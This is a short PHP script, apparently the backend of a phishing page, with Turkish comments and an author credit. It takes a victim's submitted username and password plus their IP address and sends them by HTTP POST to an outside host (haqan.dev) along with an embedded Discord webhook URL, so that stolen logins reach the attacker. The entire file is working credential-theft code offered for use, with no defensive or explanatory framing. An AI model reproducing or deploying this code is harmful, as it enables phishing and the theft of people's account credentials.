<?php
//coded by maybeoscarry 
//instagram.com/hakanburning
$username =$_POST['username'];
$password = $_POST['password'];
$ip = $SERVER['REMOTE_ADDR'];

################################
######## Sistem otomatik olarak ulke ve şehri ayarlayıp discord üzeriden göndermekte.

function httpPost($url, $data){
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    echo $response;
}

####### Url yazan Kısım discord webhooks linkiniz discord webhooks nasıl alınacağını bilmiyorsanız instagram.com/hakanburning üzerinden ulaşabilirsiniz

$data = [
    'url' => 'https://discord.com/api/webhooks/992122654964322436/lbnPIG3TKZ-LXVzw5rxklLMruAyIR6c43SdvgLGVvTbLRN-jhyyvPXfTaQv2w0knjlP_',
    'username' => $username,
    'password' => $password,
    'ip' => $ip,
    
];


httpPost('http://haqan.dev/api/', $data);
?>
